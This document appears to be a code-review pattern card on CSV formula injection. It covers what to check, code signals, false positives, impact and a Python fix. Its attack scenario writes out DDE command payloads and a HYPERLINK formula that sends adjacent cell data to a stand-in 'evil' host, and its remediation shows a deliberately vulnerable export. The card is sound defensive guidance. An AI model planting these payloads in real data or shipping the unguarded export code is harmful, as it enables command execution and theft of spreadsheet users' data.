---
id: P128
name: CSVFormulaInjection
refs: ASVS V2.x / WSTG-INPV / CS: Injection Prevention, REST Security
requires: [backend, csv]
---

# P128 — CSV Formula Injection

## Overview
CSV/Formula Injection (also called CSV injection or formula injection) occurs when attacker-controlled data that is later written into a CSV, Excel, or spreadsheet export begins with a formula trigger character — `=`, `+`, `-`, or `@` — and is emitted verbatim, unquoted, or insufficiently prefixed. When a victim (an analyst, accountant, or admin) opens the downloaded file, spreadsheet applications (Excel, LibreOffice, Google Sheets) interpret the cell as a formula and execute it. The root cause is treating a spreadsheet cell as inert text when the receiving application treats leading characters as active syntax. The impact is amplified because exports typically surface database fields (names, addresses, free-text notes, PII) that an attacker can pre-poison through any input the application persists — profile fields, support tickets, form comments — making the exploit chain stored rather than reflected.

## What to check
- Locate every export/download endpoint: CSV, `.xls`/`.xlsx`, TSV, and "download as spreadsheet" features. Trace what fields are written into each cell.
- For each cell value, confirm whether the data is prefixed/escaped before emission. Does any raw user-controlled string flow from DB row → cell without transformation?
- Does the code write the values via plain string concatenation / `csv.writer` without a neutralizing prefix, or via a library whose defaults still allow formula characters?
- Are fields that originate from free-text user input (display name, bio, address, ticket/comment body, company name, payment reference, custom field) reflected into the export? These are the primary injection vectors, even though they are "stored" data.
- Is the export rendered as an HTML table with `.xls` extension (a common shortcut)? Excel still evaluates formulas in HTML-spreadsheet hybrids, so escaping for CSV does not necessarily protect that path.
- Are numeric/monetary columns ever populated from user-controllable strings rather than parsed/cast numbers? A `-2+3` or `=SUM(...)` cell may execute.
- Check outbound email attachments and scheduled report jobs that attach spreadsheets — these reach users who never interacted with the attacker, broadening the victim set.
- Verify locale-specific separators: a comma is the default delimiter, but semicolon-separated exports (`;`) are common in EU locales and the formula trigger characters are identical.

## Static signals
CSV export construction without neutralization:
- Node: `rows.map(r => r.join(',')).join('\n')`, `res.set('Content-Type','text/csv'); res.send(rows.map(...))`, `json2csv` / `fast-csv` with default formatters
- Python: `csv.writer(response).writerow(row)`, `pandas.DataFrame.to_csv()`, `xlsxwriter` / `openpyxl` `write()` of a raw string, `StringIO` + manual `','.join`
- Java: `OpenCSV` `CSVWriter`, Apache POI `cell.setCellValue(userStr)`, Servlet writing `text/csv`
- Go: `encoding/csv` `writer.Write(record)` straight from a struct loaded off the DB
- PHP: `fputcsv($fp, $row)`, `PhpSpreadsheet` `setCellValue('A1', $input)`
- Ruby: `CSV.generate { |csv| csv << row }`, `caxlsx` `add_row`

Patterns where stored user input reaches the export unguarded:
- `export.append([user.name, user.company, user.address, user.notes])`
- `cell.setCellValue(customer.getDisplayName())`
- `to_csv(columns: [:name, :bio, :billing_ref])`
- Free-text lookups surfaced in admin/reporting dashboards: `SELECT name, comment FROM tickets ... ` → written to CSV

Sign the response without neutralizing the trigger characters:
- No `replace(/^([=+\-@])/)` / no `'\t' + value` / no `value.startsWith('=')` guard before write.

## False positives
- The exported values are strictly typed and validated server-side (numeric amounts cast to `Number`/`Decimal`, enums, UUIDs, ISO dates) before emission — they cannot begin with a formula character.
- Every string cell is wrapped in a defensive prefix (`'`, tab, or single-quote-quoted) or the export library is configured with a sanitizer/`escapeFormula` option (e.g. `xlsxwriter` strings, `fast-csv` `quote:true` plus a leading tab, `papaparse` consumers that quote).
- The export is consumed only by another machine (API-to-API, server-side parser that does not evaluate formulas) and is never opened by a human in a spreadsheet app — though defense-in-depth still recommends neutralizing.
- The application uses a dedicated spreadsheet library that writes typed cells and the value is assigned as a number/date, not a string starting with `=`.
- Input is allow-listed to a charset that excludes `= + - @` (rare; confirm the allow-list is actually enforced on the persisted value, not just on write to the export).

## Attack scenario
1. Attacker registers an account and sets their profile "Company name" to `=CMD("calc")|calc.exe!A1` (or `=HYPERLINK("https://evil/?t="&A2,"Click")`, `=SUM(1+1)*CMD(...)`, `-2+3+cmd|'/c calc'!A1`).
2. The application persists the value verbatim in the `users.company` column — no validation rejects the leading `=`.
3. An admin or finance analyst triggers the admin report / "Export users to CSV" / scheduled email attachment.
4. The export handler writes `company` straight into a cell: `"alice@example.com,=CMD(...)\n..."`.
5. The victim opens the file in Excel; the cell is auto-detected as a formula. Depending on the spreadsheet/version, Excel prompts the user to enable content, then executes — running an OS command, exfiltrating adjacent cells, or forcing a malicious outbound request via `HYPERLINK`/`WEBSERVICE`.

## Impact
- **Confidentiality**: formula side effects can leak other cell values (PII from adjacent columns) to an attacker-controlled endpoint via `WEBSERVICE`/`HYPERLINK`; DDE/legacy command execution can read local files.
- **Integrity**: command execution on the analyst's workstation (classic DDE `=CMD()` RCE on unpatched Excel), arbitrary formula computation altering displayed figures the victim trusts.
- **Availability**: malicious payloads can crash the spreadsheet, spawn runaway processes, or pivot to the victim's internal network.
- Severity scales with the victim's role (an analyst with access to bulk PII or finance data magnifies exfiltration) and with the spreadsheet application's macro/DDE posture. Stored CSV injection that reaches privileged staff via scheduled reports is typically High.

## Remediation
Neutralize formula trigger characters at the export boundary (defense-in-depth — also validate/prefix on input):
```python
# VULNERABLE — raw DB value written to CSV
import csv
writer = csv.writer(response)
for u in users:
    writer.writerow([u.email, u.company, u.notes])   # u.company may be "=CMD(...)"

# SAFE — prefix every string cell so it cannot be parsed as a formula
def neutralize(value):
    if isinstance(value, str) and value and value[0] in ('=', '+', '-', '@'):
        return "'" + value          # leading apostrophe forces text; some libs use a tab
    return value

for u in users:
    writer.writerow([u.email, neutralize(u.company), neutralize(u.notes)])
```
Prefer typing cells as numbers/dates in spreadsheet libraries (POI, openpyxl, xlsxwriter) so formula detection never applies, and disable DDE/macro auto-execution guidance in deployment docs. Validate on input as well (reject or sanitize `= + - @`-prefixed free-text where the business allows it), but never rely on input validation alone — exports must be safe regardless of stored data.

## References
- OWASP ASVS V2.x — Input and output validation, business logic controls
- OWASP WSTG-INPV — Testing for input validation (CSV / formula injection)
- OWASP Cheat Sheets: Injection Prevention, REST Security
